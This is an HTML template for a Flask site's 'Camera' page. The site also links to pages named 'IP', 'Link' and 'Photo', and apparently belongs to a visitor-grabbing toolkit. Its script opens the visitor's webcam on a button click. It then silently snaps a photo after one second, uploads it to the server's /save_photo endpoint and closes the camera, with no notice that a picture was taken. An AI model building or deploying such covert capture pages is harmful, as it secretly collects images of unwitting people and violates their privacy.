<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="/static/css/camera.css">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera</title>
</head>
<div class="container">
    <div class="logo-container">
        <img class="logo" src="../static/img/fin.svg" alt="Logo">
    </div>
    </div>
    <nav class="navbar">
        <div class="container">  
            <img src="../static/img/logo_one.svg" alt="Logo" class="navbar-logo">
          <ul class="navbar-nav">
            <li class="nav-item"><a style="color: grey;" href="{{ url_for('home') }}" class="nav-link">Home</a></li>
            <li class="nav-item"><a style="color: grey;" href="{{ url_for('about') }}" class="nav-link">About</a></li>
            <li class="nav-item"><a style="color: grey;" href="{{ url_for('contact') }}" class="nav-link">Contact</a></li>
            <li class="nav-item"><a style="color: grey;" href="{{ url_for('camera') }}" class="nav-link">Camera</a></li>
            <li class="nav-item"><a style="color: grey;" href="{{ url_for('ip') }}" class="nav-link">IP</a></li>
            <li class="nav-item"><a style="color: grey;" href="{{ url_for('link') }}" class="nav-link">Link</Link></a></li>
            <li class="nav-item"><a style="color: grey;" href="{{ url_for('photo') }}" class="nav-link">Photo</a></li>
          </ul>
        </div>
      </nav>  
<body>
<div class="button-container" onclick="handleClick()">
  <img src="../static/img/camera_icon.svg" alt="Image">
</div>
<div class="word">
  <h2>Open Camera</h2>
</div>
<div class="video-container"></div>

<script>
let cameraStream;
let cameraOpened = false;

async function openCamera() {
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = cameraStream;
        video.autoplay = true;
        video.style.width = '100%';
        video.style.height = '100%';
        video.style.transform = 'scaleX(-1)';  // Flip the video horizontally

        const videoContainer = document.querySelector('.video-container');
        videoContainer.innerHTML = '';
        videoContainer.appendChild(video);
        videoContainer.style.display = 'block';

        // Wait for 1 second before taking a photo
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Take one photo and send it to the Flask server
        takeAndSendPhoto();

        // Close the camera after taking the photo
        closeCamera();
    } catch (err) {
        console.error('Error accessing the camera:', err);
    }
}

function takeAndSendPhoto() {
    const canvas = document.createElement('canvas');
    const video = document.querySelector('video');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert the canvas content to a data URL
    const dataURL = canvas.toDataURL('image/jpeg');

    // Send the photo to the Flask server
    sendPhotoToServer(dataURL);
}

function sendPhotoToServer(dataURL) {
    // Use Fetch API to send the data to the Flask server
    fetch('/save_photo', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ photo: dataURL }),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Photo sent to server:', data);
    })
    .catch(error => {
        console.error('Error sending photo to server:', error);
    });
}
function closeCamera() {
    if (cameraStream) {
        const tracks = cameraStream.getTracks();
        tracks.forEach(track => track.stop());
        cameraStream = null;  // Release the camera stream
    }

    const videoContainer = document.querySelector('.video-container');
    videoContainer.innerHTML = '';
    videoContainer.style.display = 'none';
}

function handleClick() {
    const buttonContainer = document.querySelector('.button-container');

    if (!cameraOpened) {
        openCamera();
    } else {
        closeCamera();
    }

    cameraOpened = !cameraOpened;
}

</script>
</body>
</html>
